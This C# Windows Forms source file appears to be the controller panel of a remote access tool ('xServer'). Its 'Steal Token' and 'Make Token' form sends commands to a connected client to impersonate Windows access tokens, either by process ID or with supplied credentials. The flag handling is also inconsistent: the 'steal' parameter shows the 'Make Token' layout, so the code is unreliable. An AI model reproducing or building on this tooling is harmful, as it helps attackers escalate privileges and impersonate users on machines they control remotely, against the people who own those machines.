using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmImpersonate : Form
    {
        private Client c;
        private bool t;
        public FrmImpersonate(Client client, bool steal)
        {
            c = client;
            t = steal;
            InitializeComponent();
        }

        public FrmImpersonate()
        {
        }

        private void FrmImpersonate_Load(object sender, EventArgs e)
        {
            if (!t)
            {
                ActiveForm.Text = "Steal Token";
                txtUsername.Hide();
                mskPassword.Hide();
                lblUsername.Hide();
                lblPassword.Hide();
                lblDomain.Hide();
                txtDomain.Hide();
                lblProcessID.Show();
                txtProcID.Show();

            }
            else
            {
                ActiveForm.Text = "Make Token";
                txtUsername.Show();
                mskPassword.Show();
                lblUsername.Show();
                lblPassword.Show();
                lblDomain.Show();
                txtDomain.Show();
                lblProcessID.Hide();
                txtProcID.Hide();
            }
        }

        private void btnDoStuff_Click(object sender, EventArgs e)
        {
            if (t && txtUsername.Text != null && mskPassword.Text != null)
            {
                string pass = mskPassword.Text;
                new Core.Packets.ServerPackets.GetChangeToken(0, txtUsername.Text, pass, "make", txtDomain.Text).Execute(c);
            }
            else
            {
                MessageBox.Show("Sending steal");
                try
                {
                    int pid = int.Parse(txtProcID.Text);
                    new Core.Packets.ServerPackets.GetChangeToken(pid, null, null, "steal", null).Execute(c);
                    MessageBox.Show("Sent");

                }
                catch
                {
                    MessageBox.Show("Please enter a valid Process ID");
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            ActiveForm.Close();
        }
    }
}
